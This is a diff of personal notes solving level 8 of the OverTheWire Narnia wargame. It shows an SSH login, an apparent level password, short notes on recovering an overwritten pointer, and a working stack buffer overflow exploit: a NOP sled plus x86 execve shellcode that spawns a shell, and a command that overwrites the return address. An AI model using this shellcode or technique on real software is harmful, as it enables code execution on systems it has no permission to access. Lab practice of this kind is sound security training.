@@ -1,3 +1,13 @@
 mohthuphog
-ssh narnia7@narnia.labs.overthewire.org -p 2226
+ssh narnia8@narnia.labs.overthewire.org -p 2226
+[if we try a normal buffer overflow, we will overwrite the pointer that is used to write in the buffer]
+[to avoid this, we have to figure out what the value of the pointer is]
+[using gdb and ltrace we can find an approximate value]
+[the value of the overwritten bytes is output via printf]
+[this enables us to check up on the pointer]
+[piping the result of printf into hexdump, we can see where the overwriting stopped]
+[using this and applying trial-and-error, we can figure out the value of the pointer]
+[in the end, we set the value of the return pointer to an env variable filled with NOPs and the shellcode]
+export shellcode=$(python -c 'print "\x90" * 4000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"')
+./narnia8 $(python -c 'print 20*"A" + "\xd8\xc8\xff\xff" + 4*"A" + "\x04\xdd\xff\xff"')
 
